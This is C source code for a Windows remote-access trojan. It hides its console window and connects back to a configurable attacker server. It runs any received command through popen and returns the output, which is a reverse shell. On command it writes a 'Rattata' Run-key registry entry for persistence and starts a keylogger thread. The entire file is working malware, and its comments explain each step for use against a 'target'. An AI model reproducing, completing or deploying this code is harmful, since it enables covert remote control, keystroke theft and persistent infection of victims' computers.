#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
//Acces the log function that is inside of our jkey logger
#include "force.h"

#define bzero(p, size) (void) memset((p),0,(size))


int sock;

int bootRun(){
	
	char err[128] = "Failed\n";
	char suc[128] = "Created Persistence At : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
	TCHAR szPath[MAX_PATH];
	DWORD pathLen = 0;

	pathLen = GetModuleFileName(NULL,szPath,MAX_PATH);
	if(pathLen == 0) {
		send(sock, err, sizeof(err),0);
		return - 1;
	}

	//Create registry key value
	HKEY NewVal;
	
	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS){
		//if we werent able to store in the reqgistry then an error is going to be send
		send(sock, err, sizeof(err), 0);
		return -1;
	}

	//now that the registry is open, now we have to set the value
	DWORD pathLenInBytes = pathLen * sizeof(*szPath);
	if (RegSetValueEx(NewVal,TEXT("Rattata"), 0, REG_SZ,(LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS){
		//If we are unable to set the variable in the registry
		//we close the key
		RegCloseKey(NewVal);
		send(sock,err, sizeof(err),0);
		return -1;
	}


	//If everything worked then
	//we can succesfully close the key value
	RegCloseKey(NewVal);
	send(sock,suc,sizeof(suc),0);
	return 0;

}


char *
str_cut(char str[], int slice_from, int slice_to)
{
        if (str[0] == '\0')
                return NULL;

        char *buffer;
        size_t str_len, buffer_len;

        if (slice_to < 0 && slice_from > slice_to) {
                str_len = strlen(str);
                if (abs(slice_to) > str_len - 1)
                        return NULL;

                if (abs(slice_from) > str_len)
                        slice_from = (-1) * str_len;

                buffer_len = slice_to - slice_from;
                str += (str_len + slice_from);

        } else if (slice_from >= 0 && slice_to > slice_from) {
                str_len = strlen(str);

                if (slice_from > str_len - 1)
                        return NULL;
                buffer_len = slice_to - slice_from;
                str += slice_from;

        } else
                return NULL;

        buffer = calloc(buffer_len, sizeof(char));
        strncpy(buffer, str, buffer_len);
        return buffer;
}


void Shell(){

	// a variable that later will allow the script to delete itself after execution
	char buffer[1024];

	char container[1024];
	char total_response[18384];

	while (1){
		jump:
		//allocating 0's to the memories that this variables take that we just created above
		bzero(buffer,1024);
		bzero(container,sizeof(container));
		bzero(total_response,sizeof(total_response));

		//recieve command from server
		//store the command in the buffer variable and the size of the variable where we store the response is going to be 1024 bytes. 0 means that we just want to use does three arguments
		recv(sock,buffer, 1024, 0);

		//Execute commands in the computer
		//we are compring one character, thatis why the third argument is 1
		if (strncmp("q", buffer,1)==0){
			//Close the socket object and then the program
			closesocket(sock);
			WSACleanup();
			exit(0);
		}
		else if(strncmp("cd ", buffer, 3)==0){
			//Making the changing the directory
			chdir(str_cut(buffer,3,100));

		}
		else if(strncmp("persist", buffer, 7) ==0){
			bootRun();
		}
		else if (strncmp("keylog_start", buffer, 12) == 0){
			HANDLE thread = CreateThread(NULL,0, logg, NULL, 0, NULL);
			goto jump;
		}
		else{
			//in any other case, we want to execute the command
			
			//First, we will initialize the file descriptor
			FILE *fp;
			
			//open a file as a process or task (read the buffer and execute itinside the buffer and stored the response inside fp)
			fp = popen(buffer,"r");
			
			//get response of the computer
			//in this case this while loop will allow to concatinate the response if it is larger then 1024 bytes in order to later show us the whole response no matter of the size of the response of each command
			while(fgets(container,1024,fp) != NULL) {
				strcat(total_response, container);
			}

			//now we send the response to the server
			send(sock,total_response,sizeof(total_response),0);
			//after you are finished with a file descriptor you have to finish it with this:
			fclose(fp);

		}



	}

}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,LPSTR lpCmdLine,int nCmdShow){

	//Making the program invisible
	HWND stealth;
	AllocConsole();
	stealth =  FindWindowA("ConsoleWindowClass", NULL);
	
	ShowWindow(stealth, 0);


	//Creating Soket object in order to create the connection to our server	
	struct sockaddr_in ServAddr;
	unsigned short ServPort;
	char *ServIP;
	WSADATA wsaData;
	
	ServIP = "IP of the server you want to use";
	ServPort = 50005; // in your server make sure this inbound rule is set to anywhere using this port

	if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0){
		exit(1);
	}

	sock = socket(AF_INET, SOCK_STREAM, 0);

	memset(&ServAddr, 0, sizeof(ServAddr));	
	ServAddr.sin_family = AF_INET;
	ServAddr.sin_addr.s_addr = inet_addr(ServIP);
	ServAddr.sin_port = htons(ServPort);


	
	//connect function
	while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0){
		Sleep(10);
		
	}

	//when target connects to our server
	//We start the shell in order to for the other computer that will recieve the commands from our server and execute them and send back the output or result
	Shell();
}
